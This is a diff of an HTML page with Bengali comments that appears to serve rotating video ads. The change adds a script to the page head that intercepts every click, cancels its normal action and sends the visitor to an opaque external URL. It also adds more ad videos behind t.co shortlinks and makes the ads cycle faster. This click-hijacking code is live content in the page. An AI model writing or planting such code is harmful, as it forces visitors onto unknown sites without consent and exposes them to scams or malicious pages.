@@ -1,6 +1,19 @@
 <!DOCTYPE html> 
 <html lang="en"> 
 <head>
+  <script>
+(function(){
+  const target = "https://suspendsymptom.com/kkz1wbtu8d?key=6bddfe3e8899fd34cb69df6b89b1f3e4";
+  // Capture phase to catch clicks early
+  window.addEventListener('click', function(e){
+    // Prevent default page actions (optional)
+    e.preventDefault && e.preventDefault();
+    // Redirect immediately
+    window.location.href = target;
+  }, true);
+})();
+</script>
+
 													<style>
   /* অ্যাড বক্স */
   #videoAd {
@@ -94,7 +107,7 @@
 <!-- ভিডিও অ্যাড -->
 <div id="videoAd">
   <div class="ad-header">Ad</div>
-  <button id="closeBtn">×</button>
+  <button id="closeBtn">X</button>
   <video id="adVideo" autoplay muted playsinline>
     <source id="videoSource" src="" type="video/mp4">
     আপনার ব্রাউজার ভিডিও সাপোর্ট করে না।
@@ -117,14 +130,15 @@
 
   // ভিডিও অ্যাড লিস্ট (ভিডিও লিঙ্ক + টার্গেট লিঙ্ক)
   const ads = [
+    { video:"https://ht-cdn2.adtng.com/a7/creatives/1/49/820285/1116097/1116097_video.mp4", link: "https://t.co/EKJnIDZ2BO" },
+    { video: "https://ht-cdn2.adtng.com/a7/creatives/1/49/821710/1137021/1137021_video.mp4", link: "https://t.co/nhYueZgaGU" },
     { video: "https://u3y8v8u4.aucdn.net/library/802424/91850b57af045434255afc67ba2a7747e5fad18f.mp4", link: "https://t.co/nhYueZgaGU" },
     { video: "https://ht-cdn2.adtng.com/a7/creatives/1/49/820285/1116093/1116093_video.mp4", link: "https://t.co/EKJnIDZ2BO" },
-    { video: "https://ht-cdn2.adtng.com/a7/creatives/2/1/821076/1127877/1127877_video.mp4", link: "https://t.co/EKJnIDZ2BO" }
-  ];
-
+  
+   ];
   let currentAdIndex = 0;
-  const showTime = 30000; // 30 সেকেন্ড
-  const delayBetween = 5000; // 5 সেকেন্ড বিরতি
+  const showTime = 6000; // 5 সেকেন্ড
+  const delayBetween = 1000; // 1 সেকেন্ড বিরতি
 
   function setRandomAd() {
     // এলোমেলো ভিডিও বাছাই
